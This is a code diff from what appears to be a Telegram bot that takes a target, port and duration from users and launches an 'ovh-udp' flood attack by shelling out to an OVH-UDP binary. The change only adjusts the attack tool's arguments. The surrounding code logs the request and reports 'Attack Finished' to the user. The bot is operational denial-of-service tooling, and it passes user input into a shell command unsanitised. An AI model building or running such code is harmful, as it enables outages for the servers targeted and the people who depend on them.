@@ -284,7 +284,7 @@ def handle_kitty(message):
                 record_command_logs(user_id, '/ovh-udp', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./OVH-UDP {target} {port} {time} 200"
+                full_command = f"./OVH-UDP {target} {port} ua.txt 200 -1 {time}"
                 subprocess.run(full_command, shell=True)
                 response = f"ovh-udp Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
